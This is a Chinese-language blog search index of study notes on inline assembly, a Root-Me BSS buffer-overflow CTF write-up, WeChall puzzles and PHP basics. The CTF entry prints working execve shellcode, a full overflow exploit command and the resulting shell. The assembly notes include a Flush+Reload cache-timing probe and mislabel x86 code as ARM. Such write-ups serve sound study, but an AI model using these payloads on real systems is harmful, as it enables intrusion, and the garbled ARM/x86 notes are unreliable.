<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ARM内联汇编</title>
    <url>/2020/09/24/ARM%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/</url>
    <content><![CDATA[<h2 id="gcc-ARM内联汇编-与-预处理"><a href="#gcc-ARM内联汇编-与-预处理" class="headerlink" title="gcc ARM内联汇编 与 预处理"></a>gcc ARM内联汇编 与 预处理</h2><h3 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h3><p>define 编译<code>预处理</code>时，对程序中所有出现的“宏名”，都用宏定义中的字符串去代换</p>
<p><code>#</code>开头都是预编译指令</p>
<a id="more"></a>
<pre><code>#ifndef HEADER_FILE
#define HEADER_FILE
the entire header file file
#endif</code></pre>
<p>这种结构就是通常所说的<code>包装器 #ifndef</code>。当再次引用头文件时，<code>条件为假</code>，因为 HEADER_FILE 已定义。此时，预处理器会<code>跳过</code>文件的整个内容，编译器会忽略它。</p>
<hr>
<p>您可以使用 typedef 为一个已有的类型取一个新的名字。下面是使用 typedef 定义一个新类型的语法：</p>
<pre><code>typedef struct config *config_t; //将config* 重新定为 config_t
typedef type newname; </code></pre>
<hr>
<h3 id="ARM内联汇编"><a href="#ARM内联汇编" class="headerlink" title="ARM内联汇编"></a>ARM内联汇编</h3><p>GCC编译器支持直接在C或者C++代码中，嵌入ARM汇编代码。其基本格式非常简单，大致如下：</p>
<pre><code>__asm__ [__volatile__] ( assembler template 
           : [output operand list]                  /* optional */
           : [input operand list]                   /* optional */
           : [clobbered register list]              /* optional */
           );</code></pre>
<p>每一个操作数由下列组成</p>
<pre><code>[name]&quot;[modifier]constraint&quot;(C expression)</code></pre>
<p><code>name</code> 表示别名</p>
<p><code>限定符</code>constraint</p>
<pre><code>   &quot;a”将输入变量放入eax
   &quot;b”将输入变量放入ebx
 “c”将输入变量放入ecx
 “d”将输入变量放入edx
 “s”将输入变量放入esi
 “d”将输入变量放入edi</code></pre>
<p>GCC中定义了三个<code>修改符</code>modifier，分别是：<br>修改符    含义</p>
<pre><code>=    只写操作数，通常用于输出操作数中
+    可读且可写操作数，必须要列在输出操作数中
&amp;    寄存器只能用于输出</code></pre>
<p>编译器并不会分析你的汇编代码，找出这种被你修改过，需要恢复的寄存器，因此你必须显式的告诉编译器，被你修改过的寄存器有哪些。这就是<code>修改寄存器列表</code>所起到的作用。<br><code>clobbered register list</code></p>
<h3 id="示例-flush-and-reload"><a href="#示例-flush-and-reload" class="headerlink" title="示例__flush and reload"></a>示例__flush and reload</h3><pre><code>/*SFENCE——串行化发生在SFENCE指令之前的写操作但是不影响读操作。 
   LFENCE——串行化发生在SFENCE指令之前的读操作但是不影响写操作。 
   MFENCE——串行化发生在MFENCE指令之前的读写操作。
sfence:在sfence指令前的写操作当必须在sfence指令后的写操作前完成。
lfence：在lfence指令前的读操作当必须在lfence指令后的读操作前完成。 no instruction fol-lowing it executes before thelfenceinstruction
mfence：在mfence指令前的读写操作当必须在mfence指令后的读写操作前完成。
*/</code></pre>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">gettime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> tl;</span><br><span class="line">  <span class="keyword">asm</span> __volatile__(<span class="string">&quot;lfence\nrdtsc&quot;</span> : <span class="string">&quot;=a&quot;</span> (tl): : <span class="string">&quot;%edx&quot;</span>); <span class="comment">//“__volatile__”关键字，这个是可选的，</span></span><br><span class="line">  <span class="comment">//其作用是禁止编译器对后面编写的汇编指令再进行优化</span></span><br><span class="line">  <span class="keyword">return</span> tl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">probe</span><span class="params">(<span class="keyword">char</span> *adrs)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> time;</span><br><span class="line">    <span class="comment">//gcc arm</span></span><br><span class="line">  <span class="keyword">asm</span> __volatile__ (</span><br><span class="line">    <span class="string">&quot;  mfence             \n&quot;</span> <span class="comment">//cpuid (intel) 虚拟机会模拟该指令，导致时间增加</span></span><br><span class="line">    <span class="string">&quot;  lfence             \n&quot;</span></span><br><span class="line">    <span class="string">&quot;  rdtsc              \n&quot;</span></span><br><span class="line">    <span class="string">&quot;  lfence             \n&quot;</span> <span class="comment">//reads  the  64-bitcounter, returning the low 32 bits of the counter in%eax and the high 32 bits in%edx</span></span><br><span class="line">    <span class="string">&quot;  movl %%eax, %%esi  \n&quot;</span> <span class="comment">//把rdtsc返回的时间传入ESI保存</span></span><br><span class="line">    <span class="string">&quot;  movl (%1), %%eax   \n&quot;</span> <span class="comment">//%1表示adrs  reads  4  bytes  from  the  memory  address  in%ecx</span></span><br><span class="line">    <span class="string">&quot;  lfence             \n&quot;</span> <span class="comment">//（）表示指针</span></span><br><span class="line">    <span class="string">&quot;  rdtsc              \n&quot;</span></span><br><span class="line">    <span class="string">&quot;  subl %%esi, %%eax  \n&quot;</span> <span class="comment">//rdtsc返回值保存在eax.相减，结果保存在eax</span></span><br><span class="line">    <span class="string">&quot;  clflush 0(%1)      \n&quot;</span> <span class="comment">//()剔除缓存中的值</span></span><br><span class="line">    : <span class="string">&quot;=a&quot;</span> (time)</span><br><span class="line">    : <span class="string">&quot;c&quot;</span> (adrs)   <span class="comment">//c infer edc</span></span><br><span class="line">    :  <span class="string">&quot;%esi&quot;</span>, <span class="string">&quot;%edx&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> time;  <span class="comment">/*Loads shorter than the threshold are presumed tobe served from the cache, </span></span><br><span class="line"><span class="comment">                 indicating that another processhas accessed the memory line since it was last flushed5 from the cache*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


]]></content>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>ELF x86 - BSS buffer overflow &amp; 构造shellcode</title>
    <url>/2020/12/28/BSS_buffer_overflow/</url>
    <content><![CDATA[<p>ELF x86 - BSS buffer overflow &amp; 构造shellcode</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span> username[<span class="number">512</span>] = &#123;<span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">void</span> (*_atexit)(<span class="keyword">int</span>) =  <span class="built_in">exit</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cp_username</span><span class="params">(<span class="keyword">char</span> *name, <span class="keyword">const</span> <span class="keyword">char</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">while</span>((*(name++) = *(arg++)));</span><br><span class="line">  *name = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(argc != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] Usage : %s &lt;username&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">  cp_username(username, argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] Running program with username : %s\n&quot;</span>, username);</span><br><span class="line">   </span><br><span class="line">  _atexit(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>参考：<a href="https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20BSS%20buffer%20overflow">https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20BSS%20buffer%20overflow</a></p>
<p>The atexit and the username are global variables. Therefore, those variables positioned at the .bss section.</p>
<p>r2查看</p>
<pre><code>0x0804a040 512 obj.username
0x0804a240 4 obj._atexit</code></pre>
<p>用username溢出exit，控制EIP</p>
<pre><code>./ch7 `python -c &quot;print &#39;\x6A\x46\x31\xDB\x80\xC7\x04\x80\xC3\xB7\x89\xD9\x58\xCD\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#39; + &#39;A&#39;*474 + &#39;\x40\xa0\x04\x08&#39;&quot;`</code></pre>
<p>shellcode放在开头。</p>
<p><a href="http://www.kernel-panic.it/security/shellcode/shellcode5.html">http://www.kernel-panic.it/security/shellcode/shellcode5.html</a><br>生成shellcode:<br>execve(“/bin//sh”, [“/bin//sh”], NULL)</p>
<ol>
<li>a pointer to the name of the program to execute (in our case a pointer to the string <code>&quot;/bin/sh&quot;</code>);</li>
<li>a pointer to an array of strings to pass as <code>arguments </code>to the program (the first argument must be<code> argv[0]</code>, i.e. the name of the program itself). The <code>last element </code>of the array must be <code>a null pointer</code>;</li>
<li>a pointer to an array of strings to pass as environment to the program. These strings are usually in the form “key=value” and the last element must be a null pointer.</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> *args[<span class="number">2</span>];</span><br><span class="line">        args[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">        args[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">        execve(args[<span class="number">0</span>], args, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译运行：</p>
<pre><code>┌─[zentreisender@parrotos]─[~/Documents/root_me/app_system]
└──╼ $./get_shell 
$ ls</code></pre>
<p>需要解决的问题：</p>
<ol>
<li>shellcode中不能有NULL字符</li>
<li>需要’/bin/sh’的地址</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">jmp <span class="keyword">short</span> mycall      ; Immediately jump to the call instruction</span><br><span class="line"></span><br><span class="line">shellcode:</span><br><span class="line">    pop   esi         ; Store the address of <span class="string">&quot;/bin/sh&quot;</span> in ESI</span><br><span class="line">    [...]</span><br><span class="line"></span><br><span class="line">mycall:</span><br><span class="line">    call  shellcode   ; Push the address of the next byte onto the <span class="built_in">stack</span>: the next</span><br><span class="line">    db    <span class="string">&quot;/bin/sh&quot;</span>   ;   byte is the beginning of the <span class="built_in">string</span> <span class="string">&quot;/bin/sh&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">get_shell.<span class="keyword">asm</span></span><br><span class="line">jmp <span class="keyword">short</span>    mycall               ; Immediately jump to the call instruction</span><br><span class="line"></span><br><span class="line">shellcode:</span><br><span class="line">    pop        esi                ; Store the address of <span class="string">&quot;/bin/sh&quot;</span> in ESI</span><br><span class="line">    <span class="keyword">xor</span>        eax, eax           ; Zero out EAX 通过EAX获得<span class="literal">NULL</span></span><br><span class="line">    mov byte   [esi + <span class="number">7</span>], al      ; Write the null byte at the end of the <span class="built_in">string</span> 在字符串后添加终结符</span><br><span class="line">    mov dword  [esi + <span class="number">8</span>],  esi    ; [ESI+<span class="number">8</span>], i.e. the memory immediately below the <span class="built_in">string</span></span><br><span class="line">                                  ;   <span class="string">&quot;/bin/sh&quot;</span>, will contain the <span class="built_in">array</span> pointed to by the</span><br><span class="line">                                  ;   <span class="function">second argument of <span class="title">execve</span><span class="params">(<span class="number">2</span>)</span></span>; therefore we store in</span><br><span class="line">                                  ;   [ESI+<span class="number">8</span>] the address of the <span class="built_in">string</span>...</span><br><span class="line">    mov dword  [esi + <span class="number">12</span>], eax    ; ...<span class="keyword">and</span> in [ESI+<span class="number">12</span>] <span class="function">the <span class="literal">NULL</span> <span class="title">pointer</span> <span class="params">(EAX is <span class="number">0</span>)</span></span></span><br><span class="line">    mov        al,  0xb           ; Store the number of the syscall (11) in EAX</span><br><span class="line">    lea        ebx, [esi]         ; Copy the address of the <span class="built_in">string</span> in EBX 参数</span><br><span class="line">    lea        ecx, [esi + <span class="number">8</span>]     ; <span class="function">Second argument to <span class="title">execve</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line">    lea        edx, [esi + 12]    ; Third argument to execve(2) (NULL pointer)</span><br><span class="line">    <span class="keyword">int</span>        <span class="number">0x80</span>               ; Execute the system call</span><br><span class="line"></span><br><span class="line">mycall:</span><br><span class="line">    call       shellcode          ; Push the address of <span class="string">&quot;/bin/sh&quot;</span> onto the <span class="built_in">stack</span></span><br><span class="line">    db         <span class="string">&quot;/bin/sh&quot;</span></span><br></pre></td></tr></table></figure>
<pre><code>$ nasm -f elf get_shell.asm
$ ojdump -d get_shell.o</code></pre>
<p>汇编后得到对象文件，查看机器码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app-systeme-ch7@challenge02:~$ .&#x2F;ch7 &#96;python -c &quot;print &#39;\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68&#39; + &#39;A&#39;*474 + &#39;\x40\xa0\x04\x08&#39;&quot;&#96;</span><br><span class="line">[+] Running program with username : ë^1ÀˆF‰‰F</span><br><span class="line">°</span><br><span class="line">   V</span><br><span class="line"> ̀èãÿÿÿ&#x2F;bin&#x2F;shAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@ </span><br><span class="line">$ ls</span><br><span class="line">Makefile  ch7  ch7.c</span><br><span class="line">$ cat .passwd</span><br><span class="line">cat: .passwd: Permission denied</span><br></pre></td></tr></table></figure>
<p>shellcode权限不足</p>
<p><a href="http://shell-storm.org/shellcode/files/shellcode-599.php">http://shell-storm.org/shellcode/files/shellcode-599.php</a><br>\x6a\x17\x58\x31\xdb\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80<br>将0x17 改为0x46<br>When the permissions are setted to “s” instead of “S” a classic shellcode does not set EUID and UID of the current process to old UID (here app-systeme-ch7-cracked):<br>0x46 “sys_setreuid16” not the classic 0x17 “sys_setuid16” </p>
<hr>
<p>结构中函数指针<br>struct Dog {<br>    char name[12];<br>    void (<em>bark)();<br>    void (*bringBackTheFlag)();<br>    void (*death)(struct Dog</em>);<br>};</p>
<p><a href="https://cc-sir.github.io/2019/01/11/use_after_free/">https://cc-sir.github.io/2019/01/11/use_after_free/</a></p>
<p>use_after_free就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况:<br>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。<br>内存块被释放后，其对应的指针没有被设置为NULL，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。<br>内存块被释放后，其对应的指针没有被设置为NULL，但是在它下一次使用之前，有代码对这块内存行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。<br>而我们一般所指的 Use After Free 漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</p>
]]></content>
      <categories>
        <category>APP system in root_me</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF入门 WECALL</title>
    <url>/2020/05/15/CTF%E5%85%A5%E9%97%A8%20WECALL/</url>
    <content><![CDATA[<p>初学CTF 入门太难</p>
<h2 id="wecall-challenges-解决方法"><a href="#wecall-challenges-解决方法" class="headerlink" title="wecall challenges 解决方法"></a>wecall challenges 解决方法</h2><h4 id="training-steganoI"><a href="#training-steganoI" class="headerlink" title="training steganoI"></a>training steganoI</h4><p>$cat  xxx.bmp<br><a href="https://www.tecmint.com/13-basic-cat-command-examples-in-linux/">https://www.tecmint.com/13-basic-cat-command-examples-in-linux/</a></p>
<h4 id="Crypto-Caesar-I"><a href="#Crypto-Caesar-I" class="headerlink" title="Crypto - Caesar I"></a>Crypto - Caesar I</h4><p>python函数 list() ord() chr()</p>
<a id="more"></a>

<h4 id="WWW-Robots"><a href="#WWW-Robots" class="headerlink" title="WWW-Robots"></a>WWW-Robots</h4><p>robots.txt<br>The robots.txt file is used by web crawlers to check if they are allowed to crawl and index your website or only parts of it.<br>Sometimes these files reveal the directory structure instead protecting the content from being crawled.</p>
<h4 id="URL-ENCODE"><a href="#URL-ENCODE" class="headerlink" title="URL ENCODE"></a>URL ENCODE</h4><p>URL encoding replaces unsafe ASCII characters with a “%” followed by two hexadecimal digits. 十六进制<br>URLs cannot contain spaces. URL encoding normally replaces a space with a plus (+) sign or with %20.<br>URLs can only be sent over the Internet using the ASCII character-set.</p>
<h4 id="python-3-7"><a href="#python-3-7" class="headerlink" title="python 3.7"></a>python 3.7</h4><p>from urllib.parse import unquote<br>tar -xf 解压缩 ？自动识别<br>java -jar </p>
<h4 id="Training-Programming-1"><a href="#Training-Programming-1" class="headerlink" title="Training: Programming 1"></a>Training: Programming 1</h4><p>urllib.request</p>
<p>urlopen返回的是二进制数据，decode(‘utf-8’)解码</p>
<h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><p><a href="https://zh.wikipedia.org/wiki/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F">https://zh.wikipedia.org/wiki/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F</a></p>
<p>‘weshall’</p>
<p>wechall4?.(jpg|gif|tiff|bmp|png)</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF入门 WECALL 2</title>
    <url>/2020/05/19/CTF%E5%85%A5%E9%97%A8%20WECALL1/</url>
    <content><![CDATA[<h3 id="什么是PHP文件？"><a href="#什么是PHP文件？" class="headerlink" title="什么是PHP文件？"></a>什么是PHP文件？</h3><p>PHP文件可以包含文本，HTML，CSS，JavaScript和PHP代码<br>PHP代码在服务器上执行，结果以纯HTML格式返回到浏览器<br>PHP文件的扩展名为“ .php”</p>
<a id="more"></a>
<h3 id="PHP可以做什么？"><a href="#PHP可以做什么？" class="headerlink" title="PHP可以做什么？"></a>PHP可以做什么？</h3><p>PHP可以生成动态页面内容<br>PHP可以在服务器上创建，打开，读取，写入，删除和关闭文件<br>PHP可以收集表单数据<br>PHP可以发送和接收Cookie<br>PHP可以添加，删除，修改数据库中的数据<br>PHP可用于控制用户访问<br>PHP可以加密数据<br>使用PHP，您不仅可以输出HTML。您可以输出图像，PDF文件甚至Flash电影。您还可以输出任何文本，例如XHTML和XML。</p>
<p>PHP脚本可以放在文档中的任何位置。<br>PHP脚本的开头<code>&lt;?php</code>和结尾是<code> ?&gt;</code>：<br><?php
// PHP code goes here
?><br>PHP文件的默认文件扩展名是“ .php”。<br>一个PHP文件通常包含HTML标记和一些PHP脚本代码。</p>
<p> PHP语句以分号（<code>;</code>）结尾。</p>
<p>在PHP中，关键字（例如if， else，while， echo等），类，函数，和用户定义的函数<code>是不区分大小写。</code></p>
<p>所有<code>变量名称均区分大小写</code>！</p>
<p>comment<br>//<br>#<br>/*        */</p>
<p>在PHP中，变量以$符号开头，后跟变量名称</p>
<p>与其他编程语言不同，PHP没有用于声明变量的命令。它是在您首次为其分配值时创建的。</p>
<?php
$txt = "W3Schools.com";
echo "I love $txt!";
?>

<?php
$txt = "W3Schools.com";
echo "I love " . $txt . "!";
?>

<?php
$x = 5;
$y = 4;
echo $x + $y;
?>

<h5 id="在函数外部声明的变量具有全局范围，并且只能在函数外部访问"><a href="#在函数外部声明的变量具有全局范围，并且只能在函数外部访问" class="headerlink" title="在函数外部声明的变量具有全局范围，并且只能在函数外部访问"></a>在函数外部声明的变量具有全局范围，并且只能在函数外部访问</h5><h5 id="在函数内声明的变量具有局部范围，只能在该函数内访问"><a href="#在函数内声明的变量具有局部范围，只能在该函数内访问" class="headerlink" title="在函数内声明的变量具有局部范围，只能在该函数内访问"></a>在函数内声明的变量具有局部范围，只能在该函数内访问</h5><h5 id="global关键字用于在函数内部访问一个全局变量。"><a href="#global关键字用于在函数内部访问一个全局变量。" class="headerlink" title="global关键字用于在函数内部访问一个全局变量。"></a>global关键字用于在函数内部访问一个全局变量。</h5><p>为此，请global在变量之前（在函数内部）使用关键字<br><?php
$x = 5;
$y = 10;
function myTest() {
  global $x, $y;
  $y = $x + $y;
}
myTest();
echo $y; // outputs 15
?></p>
<p>PHP also stores all global variables in an array called $GLOBALS[index]. The index holds the name of the variable. This array is also accessible from within functions and can be used to update global variables directly.</p>
<?php
$x = 5;
$y = 10;
function myTest() {
  $GLOBALS['y'] = $GLOBALS['x'] + $GLOBALS['y'];
}
myTest();
echo $y; // outputs 15
?>

<p>通常，当一个函数完成/执行时，它的所有变量都会被删除。但是，有时我们希望不删除局部变量。我们需要它来做进一步的工作。<br>为此，请static在首次声明变量时使用关键字<br>然后，每次调用该函数时，该变量仍将具有自上次调用该函数以来所包含的信息。<br>注意：该变量仍然是函数的局部变量。</p>
<p>差异很小：echo没有返回值，而print返回值为1，因此可以在表达式中使用。echo可以采用多个参数（尽管这种用法很少见），而print可以采用一个参数。echo比快一点print。</p>
<?php
echo "<h2>PHP is Fun!</h2>";
echo "Hello world!<br>";
echo "I'm about to learn PHP!<br>";
echo "This ", "string ", "was ", "made ", "with multiple parameters.";
?>

<h5 id="字符串可以是引号内的任何文本。可以使用单引号或双引号"><a href="#字符串可以是引号内的任何文本。可以使用单引号或双引号" class="headerlink" title="字符串可以是引号内的任何文本。可以使用单引号或双引号"></a>字符串可以是引号内的任何文本。可以使用单引号或双引号</h5><p>整数数据类型是-2,147,483,648和2,147,483,647之间的非十进制数。<br>PHP var_dump（）函数返回数据类型和值</p>
<?php
$cars = array("Volvo","BMW","Toyota");
var_dump($cars);
?>

<p>首先，我们必须声明一个对象类。为此，我们使用class关键字。类是可以包含属性和方法的结构：<br><?php
class Car {
  function Car() {
    $this->model = "VW";
  }
}
// create an object
$herbie = new Car();
// show object properties
echo $herbie->model;
?></p>
<p>如果创建的变量没有值，则会自动为其分配值NULL。<br>也可以通过将值设置为NULL来清空变量：</p>
<p>关于PHP的注意事项之一是它提供了自动数据类型转换。<br>因此，如果将整数值分配给变量，则该变量的类型将自动为整数。然后，如果将字符串分配给相同的变量，则类型将更改为字符串。</p>
<p>整数可以以三种格式指定：十进制（基于10的），十六进制（基于16的-带有0x前缀）或八进制（基于8的-带有0前缀）</p>
<p>（int），（integer）或intval（）函数通常用于将值转换为整数。</p>
<p>有效的常量名称以字母或下划线开头（常量名称前没有$符号）。</p>
<p>注意：与变量不同，常量在整个脚本中自动为全局变量。<br>define(name, value, case-insensitive)<br>在PHP7中，您可以使用define()函数创建一个Array常量。</p>
<p>.    Concatenation    $txt1 . $txt2    Concatenation of $txt1 and $txt2<br>.=    Concatenation assignment    $txt1 .= $txt2    Appends $txt2 to $txt1</p>
<?php
$t = date("H");

if ($t < "20") {
  echo "Have a good day!";
}
?>

<h4 id="该foreach循环仅适用于数组，用于循环遍历数组中的每个键-值对。"><a href="#该foreach循环仅适用于数组，用于循环遍历数组中的每个键-值对。" class="headerlink" title="该foreach循环仅适用于数组，用于循环遍历数组中的每个键/值对。"></a>该foreach循环仅适用于数组，用于循环遍历数组中的每个键/值对。</h4><p>句法<br>foreach ($array as $value) {<br>  code to be executed;<br>}<br>对于每次循环迭代，当前数组元素的值都分配给$ value，并且数组指针移动一个，直到到达最后一个数组元素。</p>
<p>要指定，strict我们需要设置declare(strict_types=1);。这必须在PHP文件的第一行。<br>这为我们提供了一个在声明函数时指定所需数据类型的选项，并且通过添加strict 声明，如果数据类型不匹配，它将抛出“致命错误”。</p>
<?php declare(strict_types=1); // strict requirement
function addNumbers(float $a, float $b) : float {
  return $a + $b;
}
echo addNumbers(1.2, 5.2);
?>

<?php declare(strict_types=1); // strict requirement
function addNumbers(float $a, float $b) : int {
  return (int)($a + $b);
}
echo addNumbers(1.2, 5.2);
?>

<?php
$cars = array("Volvo", "BMW", "Toyota");
echo "I like " . $cars[0] . ", " . $cars[1] . " and " . $cars[2] . ".";
?>

<p>关联数组是使用分配给它们的命名键的数组。<br>有两种创建关联数组的方法：<br>$age = array(“Peter”=&gt;”35”, “Ben”=&gt;”37”, “Joe”=&gt;”43”);<br>要么：<br>$age[‘Peter’] = “35”;<br>$age[‘Ben’] = “37”;<br>$age[‘Joe’] = “43”;<br>然后可以在脚本中使用命名的键：</p>
<p>$cars = array (<br>  array(“Volvo”,22,18),<br>  array(“BMW”,15,13),<br>  array(“Saab”,5,2),<br>  array(“Land Rover”,17,15)<br>);<br><?php
echo $cars[0][0].": In stock: ".$cars[0][1].", sold: ".$cars[0][2].".<br>";
echo $cars[1][0].": In stock: ".$cars[1][1].", sold: ".$cars[1][2].".<br>";
echo $cars[2][0].": In stock: ".$cars[2][1].", sold: ".$cars[2][2].".<br>";
echo $cars[3][0].": In stock: ".$cars[3][1].", sold: ".$cars[3][2].".<br>";
?></p>
<p>sort() -以升序排列数组<br>rsort() -以降序排列数组<br>asort() -根据值以升序对关联数组进行排序<br>ksort() -根据键以升序对关联数组进行排序<br>arsort() -根据值以降序对关联数组进行排序<br>krsort() -根据键以降序对关联数组进行排序</p>
<h4 id="用于在使用method-“-post”提交HTML表单后收集表单数据。-POST也广泛用于传递变量。"><a href="#用于在使用method-“-post”提交HTML表单后收集表单数据。-POST也广泛用于传递变量。" class="headerlink" title="用于在使用method =“ post”提交HTML表单后收集表单数据。$ _POST也广泛用于传递变量。"></a>用于在使用method =“ post”提交HTML表单后收集表单数据。$ _POST也广泛用于传递变量。</h4><h5 id="SERVER-‘PHP-SELF’-Returns-the-filename-of-the-currently-executing-script"><a href="#SERVER-‘PHP-SELF’-Returns-the-filename-of-the-currently-executing-script" class="headerlink" title="$_SERVER[‘PHP_SELF’]    Returns the filename of the currently executing script"></a>$_SERVER[‘PHP_SELF’]    Returns the filename of the currently executing script</h5><h5 id="SERVER-‘REQUEST-METHOD’-Returns-the-request-method-used-to-access-the-page-such-as-POST"><a href="#SERVER-‘REQUEST-METHOD’-Returns-the-request-method-used-to-access-the-page-such-as-POST" class="headerlink" title="$_SERVER[‘REQUEST_METHOD’]    Returns the request method used to access the page (such as POST)"></a>$_SERVER[‘REQUEST_METHOD’]    Returns the request method used to access the page (such as POST)</h5><h4 id="PHP-GET是一个PHP超级全局变量，用于在使用method-“-get”提交HTML表单后收集表单数据。"><a href="#PHP-GET是一个PHP超级全局变量，用于在使用method-“-get”提交HTML表单后收集表单数据。" class="headerlink" title="PHP $ _GET是一个PHP超级全局变量，用于在使用method =“ get”提交HTML表单后收集表单数据。"></a>PHP $ _GET是一个PHP超级全局变量，用于在使用method =“ get”提交HTML表单后收集表单数据。</h4><h5 id="GET还可以收集在URL中发送的数据。"><a href="#GET还可以收集在URL中发送的数据。" class="headerlink" title="$ _GET还可以收集在URL中发送的数据。"></a>$ _GET还可以收集在URL中发送的数据。</h5><h4 id="使用GET方法从表单发送的信息对所有人都是可见的（所有变量名和值都显示在URL中）。GET对发送的信息量也有限制。限制约为2000个字符。但是，由于变量显示在URL中，因此可以为页面添加书签。在某些情况下这可能很有用。"><a href="#使用GET方法从表单发送的信息对所有人都是可见的（所有变量名和值都显示在URL中）。GET对发送的信息量也有限制。限制约为2000个字符。但是，由于变量显示在URL中，因此可以为页面添加书签。在某些情况下这可能很有用。" class="headerlink" title="使用GET方法从表单发送的信息对所有人都是可见的（所有变量名和值都显示在URL中）。GET对发送的信息量也有限制。限制约为2000个字符。但是，由于变量显示在URL中，因此可以为页面添加书签。在某些情况下这可能很有用。"></a>使用GET方法从表单发送的信息对所有人都是可见的（所有变量名和值都显示在URL中）。GET对发送的信息量也有限制。限制约为2000个字符。但是，由于变量显示在URL中，因此可以为页面添加书签。在某些情况下这可能很有用。</h4><p>GET可以用于发送非敏感数据。<br>注意：绝对不要将GET用于发送密码或其他敏感信息！</p>
